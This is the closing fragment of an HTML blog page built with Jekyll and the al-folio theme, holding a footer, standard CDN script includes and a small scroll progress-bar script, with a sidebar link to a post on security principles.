href="/blog/2024/THM-Security-Principles/">THM Security Principles</a> </li> </div> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2024 NonoHM . Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?da39b660470d1ba6e6b8bf5f37070b6e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>
